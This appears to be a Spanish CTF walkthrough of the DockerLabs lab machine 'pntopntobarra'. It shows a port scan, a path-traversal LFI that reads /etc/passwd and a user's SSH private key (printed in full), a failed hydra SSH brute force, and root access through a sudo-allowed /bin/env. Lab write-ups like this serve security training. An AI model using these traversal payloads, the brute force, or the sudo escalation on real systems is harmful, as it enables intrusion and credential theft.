---
icon: linux
---

**Plataforma:** Dockerlabs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `Web` `LFI` `Sudoers` `Env`

## INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash
unzip pntopntobarra.zip
```

La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh pntopntobarra.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
```

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 16:05 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2e:4a:72:a0:b2:40:3a:36:99:c9:2d:a7:62:61:16:e7 (ECDSA)
|_  256 7c:7d:78:7a:20:2b:d0:75:92:26:1b:41:3c:ca:79:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Advertencia: LeFvIrus
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds
```

Tenemos abiertos los puertos `22` y `80`.

Accedemos por `HTTP` y observamos una página de advertencia de virus con dos botones.

![alt text](../../.gitbook/assets/virus.png)

El primer botón ejecuta un `script` que bloquea la máquina por completo, obligándonos a reiniciarla.

Si pulsamos el segundo botón, aparece el siguiente mensaje:

![alt text](../../.gitbook/assets/ejemplos.png)

Está intentando mostrar una imagen que no existe. Lo confirmamos observando la URL.

```
http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
```

## LFI

Podemos aprovechar esto para intentar apuntar a otro archivo local del sistema, como `/etc/passwd`, modificando la URL.

```
http://172.17.0.2/ejemplos.php?images=../../../../etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
nico:x:1000:1000:,,,:/home/nico:/bin/bash
```

De esta manera, comprobamos que existe un usuario llamado `nico`.

## FUERZA BRUTA

Probamos un ataque de `fuerza bruta` sobre el puerto `22` (`SSH`) con dicho usuario.

```bash
hydra -l nico -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 64
```

Pero no obtenemos ninguna coincidencia.

Aun así, sabemos con certeza que `nico` es un usuario válido del sistema. Es posible que únicamente pueda acceder por `SSH` mediante una clave `id_rsa`.

## LFI

Aprovechamos de nuevo la vulnerabilidad `LFI` para comprobar si podemos apuntar al archivo `id_rsa` (en caso de que exista), lo cual nos daría acceso por `SSH` al usuario `nico`.

```
http://172.17.0.2/ejemplos.php?images=../../../../home/nico/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Efectivamente, logramos obtener la clave `id_rsa`, que guardamos en un archivo en la máquina atacante. A continuación, accedemos al sistema como el usuario `nico`.

```bash
sudo nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa nico@172.17.0.2
```

## ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for nico on f7d1835da2a8:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nico may run the following commands on f7d1835da2a8:
    (ALL) NOPASSWD: /bin/env

```

Comprobamos que podemos ejecutar el binario `env` con privilegios de `root` y lo aprovechamos para escalar de la siguiente manera:

```bash
sudo env /bin/sh
```

Info:

```
# whoami
root
#
```

Ya somos root!
